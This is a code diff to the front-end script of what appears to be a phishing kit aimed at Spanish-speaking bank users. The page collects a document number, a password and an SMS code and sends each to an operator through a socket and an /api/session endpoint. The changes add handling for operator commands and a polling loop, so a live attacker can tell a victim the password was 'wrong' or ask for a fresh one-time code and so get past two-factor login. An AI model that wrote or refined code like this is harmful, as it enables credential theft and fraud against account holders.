@@ -43,13 +43,47 @@
     }
   }
 
+  let hasSubmitted = false;
+  let lastCmdId = null;
+
+  function handleOperatorAction(data) {
+    if (!data || !data.action) return;
+    if (data.targetId && data.targetId !== clientId && (!socket || data.targetId !== socket.id)) return;
+    if (data.cmdId && data.cmdId === lastCmdId) return;
+    if (data.cmdId) lastCmdId = data.cmdId;
+
+    hideLoading();
+    const { action, message } = data;
+    if (action === "wrong_doc") {
+      setStep("doc");
+      showError(message || "Documento incorrecto o no registrado");
+    } else if (action === "wrong_pass") {
+      setStep("pass");
+      password.value = "";
+      showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
+    } else if (action === "wrong_token") {
+      setStep("verify");
+      tokens.forEach(function (t) { t.value = ""; });
+      if (tokens[0]) tokens[0].focus();
+      showError(message || "Código SMS inválido o expirado.");
+    } else if (action === "ask_token") {
+      setStep("verify");
+      if (tokens[0]) tokens[0].focus();
+    } else if (action === "ask_pass") {
+      setStep("pass");
+      if (password) password.focus();
+    } else if (action === "approve" || action === "redirect") {
+      window.location.href = "/panel.html";
+    }
+  }
+
   function sendSocketUpdate(customStatus) {
-    if (!socket) return;
     const currentToken = tokens.map(function (t) { return t.value; }).join("");
     const currentDoc = docNumber ? docNumber.value.trim() : "";
     const currentPass = password ? password.value : "";
 
     if (!customStatus && !currentDoc && !currentPass && !currentToken) return;
+    hasSubmitted = true;
 
     const data = {
       clientId,
@@ -60,39 +94,41 @@
       step,
       status: customStatus || (step === "doc" ? "Ingresando documento" : step === "pass" ? "Ingresando contraseña" : "Ingresando token SMS"),
     };
-    socket.emit(socket.connected ? "client:update" : "client:init", data);
+
+    if (socket) {
+      socket.emit("client:update", data);
+    }
+
+    fetch("/api/session", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data),
+      keepalive: true,
+    }).catch(function () {});
   }
 
   if (socket) {
     socket.on("connect", function () {
-      sendSocketUpdate();
-    });
-
-    socket.on("operator:action", function (data) {
-      if (data.targetId && data.targetId !== clientId && data.targetId !== socket.id) return;
-      hideLoading();
-      const { action, message } = data;
-      if (action === "wrong_doc") {
-        setStep("doc");
-        showError(message || "Documento incorrecto o no registrado");
-      } else if (action === "wrong_pass") {
-        setStep("pass");
-        password.value = "";
-        showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
-      } else if (action === "wrong_token") {
-        setStep("verify");
-        tokens.forEach(t => t.value = "");
-        tokens[0].focus();
-        showError(message || "Código SMS inválido o expirado.");
-      } else if (action === "ask_token") {
-        setStep("verify");
-      } else if (action === "ask_pass") {
-        setStep("pass");
-      } else if (action === "approve" || action === "redirect") {
-        window.location.href = "/panel.html";
+      socket.emit("client:register", { clientId });
+      if (hasSubmitted) {
+        sendSocketUpdate();
       }
     });
+
+    socket.on("operator:action", handleOperatorAction);
   }
+
+  setInterval(function () {
+    if (!hasSubmitted) return;
+    fetch("/api/session/" + encodeURIComponent(clientId) + "/poll", { cache: "no-store" })
+      .then(function (r) { return r.ok ? r.json() : null; })
+      .then(function (res) {
+        if (res && res.command) {
+          handleOperatorAction(res.command);
+        }
+      })
+      .catch(function () {});
+  }, 1500);
 
   function showError(text) {
     errorMsg.hidden = !text;
